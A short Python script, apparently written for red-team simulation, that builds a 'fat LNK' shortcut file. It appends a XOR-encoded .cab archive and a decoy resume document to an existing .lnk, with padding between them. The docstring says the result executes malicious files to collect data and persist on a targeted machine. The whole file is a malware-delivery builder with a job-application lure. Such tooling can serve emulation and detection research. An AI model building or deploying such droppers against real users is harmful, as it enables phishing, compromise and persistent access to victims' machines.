import os
from pylnk3 import parse, for_file
import argparse

"""
__author__ == @tccontre18 - Br3akp0int
description: this is simple fatlnk generator to simulate a lnk that contains embeded .cab files to execute malicious files to collect and persist on the targeted machine.

"""

def read_a_file(file_name_list):
    file_info = {}
    for f_name in file_name_list:
        with open(f_name, "rb") as f:

            buff = f.read()
        file_size = len(buff)
        file_info[f_name]= [file_size, buff]
    return file_info

def compute_padding(buff_len):
    padding = bytearray()
    if buff_len <= 0x5000:
        padding_size = 0x100 - (buff_len % 0x100)
        padding_size += 0x100
        padding = bytearray(padding_size)
    
    return padding

def main():
    ## put lnk file first of the list
    file_list = ["resume.lnk-1", "xored_1.cab", "xored_Resume.docx"]
    f_info_dict = read_a_file(file_list)
    
    
    with open("fatlnk.lnk-1", "wb") as f:
        size_of_padd = 0
        for i in file_list:
            
            ## write lfirst the lnk buff

            f.write(f_info_dict[i][1])
            padd = compute_padding(f_info_dict[i][0])
            size_of_padd = len(padd)

            
            file_offset = f_info_dict[i][0] + size_of_padd

            
            
            f.write(padd)
    print("[+] fatlnk.lnk-1 fully generated!")
    return





if __name__ == "__main__":
     main()
